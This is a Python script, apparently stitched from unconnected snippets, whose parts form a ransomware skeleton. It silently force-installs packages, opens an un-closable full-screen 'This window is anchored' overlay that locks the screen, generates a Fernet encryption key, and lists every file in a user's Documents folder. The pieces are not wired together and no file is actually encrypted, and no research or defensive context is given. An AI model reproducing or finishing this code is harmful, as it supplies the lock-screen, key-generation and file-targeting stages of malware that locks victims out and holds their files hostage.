import os
import sys
import subprocess as sp 

def packets():
    try:
        import pygame as pyg
        from cryptography.fernet import Fernet as fern
    except ModuleNotFoundError:
        cmd_pip = [sys.executable, '-m', 'pip', 'install', '--upgrade', '--user', 'pip']
        cmd_pyg = [sys.executable,'-m', 'pip', 'install', '--user', 'pygame-ce']
        cmd_crypt = [sys.executable, '-m', 'pip', 'install', '--user', 'cryptography']
        cmds = [cmd_pip, cmd_pyg, cmd_crypt]
        for cmd in cmds:
            sp.check_call(cmd[:-1] + ["--break-system-packages", cmd[-1]])
packets()

import tkinter as tk
import random

def create_popup():
    root = tk.Tk()
    root.withdraw() 
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    popup = tk.Toplevel()
    popup.title(f"Status Window")
    popup.geometry(f"{screen_width}x{screen_height}+0+0")
    popup.overrideredirect(True)
    popup.attributes("-topmost", True)
    label = tk.Label(popup, text=f"Alert: Process 1\nThis window is anchored.", pady=20)
    label.pack()
    root.mainloop()

if __name__ == "__main__":
    create_popup()

from cryptography.fernet import Fernet

secret_key = Fernet.generate_key()
print(f"Generated Key: {secret_key.decode()}\n")

cipher_suite = Fernet(secret_key)

plain_text = "This is a highly confidential message."
bytes_message = plain_text.encode('utf-8')

cipher_text = cipher_suite.encrypt(bytes_message)
print(f"Encrypted (Ciphertext): {cipher_text.decode()}\n")

decrypted_bytes = cipher_suite.decrypt(cipher_text)
decrypted_text = decrypted_bytes.decode('utf-8')
print(f"Decrypted (Plaintext): {decrypted_text}")


import os

all_files = []
target_directory = r"C:\Users\YourUsername\Documents"

for root, directories, files in os.walk(target_directory):
    for filename in files:
        full_path = os.path.join(root, filename)
        all_files.append(full_path)

print(f"Total files found: {len(all_files)}")
print(all_files[:10])
